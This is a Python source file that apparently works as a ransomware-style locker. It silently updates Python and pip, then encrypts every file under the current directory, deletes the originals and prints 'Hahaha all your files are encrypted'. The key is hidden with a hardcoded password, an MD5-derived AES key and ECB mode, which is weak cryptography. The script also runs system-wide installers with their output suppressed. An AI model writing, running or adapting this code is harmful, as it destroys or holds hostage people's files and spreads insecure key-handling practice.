import os
import subprocess
import sys
import platform
import urllib.request
import gzip
import io
import re
import threading
import time
from cryptography.fernet import Fernet
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import getpass

# Global flag to stop loading animation
stop_animation = False

# Function to display a loading animation
def loading_animation():
    animation = "|/-\\"
    idx = 0
    while not stop_animation:
        print(f"\rDownloading... {animation[idx % len(animation)]}", end='', flush=True)
        idx += 1
        time.sleep(0.1)

# Function to check the installed Python version
def get_installed_python_version():
    version_info = sys.version_info
    return f"{version_info.major}.{version_info.minor}.{version_info.micro}"

# Function to get the latest Python version from the Python website
def get_latest_python_version():
    url = "https://www.python.org/downloads/"
    try:
        response = urllib.request.urlopen(url)
        # Check if the response is compressed
        if response.headers.get('Content-Encoding') == 'gzip':
            buf = io.BytesIO(response.read())
            with gzip.GzipFile(fileobj=buf) as f:
                html = f.read().decode('utf-8', errors='replace')
        else:
            html = response.read().decode('utf-8', errors='replace')
        
        match = re.search(r'Latest Python 3 Release - Python (\d+\.\d+\.\d+)', html)
        return match.group(1) if match else "3.13"
    except Exception as e:
        print(f"Error fetching latest Python version: {e}")
        return "3.13"

# Function to download and install Python if needed
def update_python():
    latest_version = get_latest_python_version()
    installed_version = get_installed_python_version()
    
    if installed_version == latest_version:
        print(f"Python {installed_version} is already the latest version.")
        return
    
    print(f"Updating Python from version {installed_version} to {latest_version}...")
    installer_url = f"https://www.python.org/ftp/python/{latest_version}/python-{latest_version}-amd64.exe"
    installer_path = f"python-{latest_version}-amd64.exe"

    try:
        print("Downloading Python...")
        urllib.request.urlretrieve(installer_url, installer_path)
        
        print("Installing Python...")
        subprocess.check_call([installer_path, "/quiet", "InstallAllUsers=1", "PrependPath=1"])
        
        print("Python updated successfully.")
        os.remove(installer_path)
    except Exception as e:
        print(f"Error updating Python: {e}")

# Function to install or upgrade pip
def install_or_upgrade_pip():
    try:
        import pip
    except ImportError:
        print("Installing pip...")
        download_and_install('https://bootstrap.pypa.io/get-pip.py')
        print("pip installed successfully.")
    else:
        print("Upgrading pip...")
        execute_command([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
        print("pip upgraded successfully.")

# Function to install required libraries
def install_required_libraries():
    required_libraries = {
        "cryptography": "cryptography",
        "pycryptodome": "pycryptodome"
    }
    
    for library, package_name in required_libraries.items():
        try:
            __import__(library)
        except ImportError:
            print(f"Required library '{package_name}' not found. Installing...")
            execute_command([sys.executable, "-m", "pip", "install", package_name])

# Utility function to execute a command and hide its output
def execute_command(command):
    with open(os.devnull, 'w') as devnull:
        subprocess.check_call(command, stdout=devnull, stderr=devnull)

# Utility function to download and install a script
def download_and_install(url):
    script_name = url.split('/')[-1]
    urllib.request.urlretrieve(url, script_name)
    execute_command([sys.executable, script_name])
    os.remove(script_name)

# Start the loading animation in a separate thread
def start_loading_animation():
    global stop_animation
    stop_animation = False
    animation_thread = threading.Thread(target=loading_animation)
    animation_thread.start()
    return animation_thread

# Stop the loading animation
def stop_loading_animation(animation_thread):
    global stop_animation
    stop_animation = True
    animation_thread.join()
    print("\rDone!                      ")

# Function to install or upgrade pip and required libraries
def setup_environment():
    animation_thread = start_loading_animation()
    try:
        update_python()
        install_or_upgrade_pip()
        install_required_libraries()
    finally:
        stop_loading_animation(animation_thread)
        clear_screen()

# Clear the screen based on the operating system
def clear_screen():
    if os.name == 'posix':
        os.system('clear')
    elif os.name == 'nt':
        os.system('cls')

# Print a message in green with a border
def print_large_message_in_green(message):
    border = '*' * (len(message) + 4)
    green_color_code = "\033[92m"
    reset_color_code = "\033[0m"
    
    print(f"{green_color_code}{border}{reset_color_code}")
    print(f"{green_color_code}* {message} *{reset_color_code}")
    print(f"{green_color_code}{border}{reset_color_code}")

# Generate a new Fernet key for encryption/decryption
def generate_key():
    return Fernet.generate_key()

# Encrypt a specific file using a Fernet key
def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as file:
            data = file.read()

        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(data)

        encrypted_file_path = file_path + '.encrypted'
        with open(encrypted_file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)
        os.remove(file_path)
        print(f"Encrypted {file_path}")
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")

# Decrypt a specific file using a Fernet key
def decrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as file:
            encrypted_data = file.read()

        fernet = Fernet(key)
        decrypted_data = fernet.decrypt(encrypted_data)

        original_file_path = file_path.replace('.encrypted', '')
        with open(original_file_path, 'wb') as decrypted_file:
            decrypted_file.write(decrypted_data)
        os.remove(file_path)
        print(f"Decrypted {file_path}")
    except Exception as e:
        print(f"Error decrypting {file_path}: {e}")

# Encrypt all files in the specified directory, excluding the script itself and .key files
def encrypt_directory(directory, key):
    try:
        script_name = os.path.basename(__file__)
        
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                if file != script_name and not file.endswith('.key'):
                    encrypt_file(file_path, key)
    except Exception as e:
        print(f"Error encrypting directory {directory}: {e}")

# Decrypt all files ending with .encrypted in the specified directory
def decrypt_directory(directory, key):
    try:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                if file.endswith('.encrypted'):
                    decrypt_file(file_path, key)
    except Exception as e:
        print(f"Error decrypting directory {directory}: {e}")

# Save the encrypted Fernet key using a custom password
def save_encrypted_key(key):
    custom_password = "itamar"  # Change this to a memorable password of your choice

    custom_key = hashlib.md5(custom_password.encode()).digest()  # Create an AES key using the MD5 hash of the password
    cipher = AES.new(custom_key, AES.MODE_ECB)
    encrypted_key = cipher.encrypt(pad(key, AES.block_size))
    with open('key.txt', 'wb') as key_file:
        key_file.write(encrypted_key)

# Create a script that allows users to reveal the Fernet key with the correct password
def create_show_key_script():
    show_key_script = """
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import getpass

def decrypt_key():
    custom_password = "itamar"  # Change this to match the password used in save_encrypted_key
    custom_key = hashlib.md5(custom_password.encode()).digest()
    cipher = AES.new(custom_key, AES.MODE_ECB)

    try:
        with open('key.txt', 'rb') as key_file:
            encrypted_key = key_file.read()

        user_password = getpass.getpass("Enter the decryption password: ").encode()
        user_key = hashlib.md5(user_password).digest()

        if user_key == custom_key:
            key = unpad(cipher.decrypt(encrypted_key), AES.block_size)
            print("Decrypted key:")
            print(key.decode())
        else:
            print("Wrong password!")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    decrypt_key()
"""
    with open('show_key.py', 'w') as script_file:
        script_file.write(show_key_script)
    clear_screen()

# Main function to drive the script
def main():
    setup_environment()
    action = input("Would you like to encrypt or decrypt the files? (e/d): ").strip().lower()

    if action == 'e':
        encryption_key = generate_key()
        save_encrypted_key(encryption_key)
        encrypt_directory(os.getcwd(), encryption_key)
        print_large_message_in_green("Hahaha all your files are encrypted")
    elif action == 'd':
        decryption_key = input("Enter the encryption key: ").encode()
        decrypt_directory(os.getcwd(), decryption_key)
        print_large_message_in_green("All files have been successfully recovered.")
    else:
        print("Invalid action. Please choose either 'e' or 'd'.")

if __name__ == "__main__":
    main()
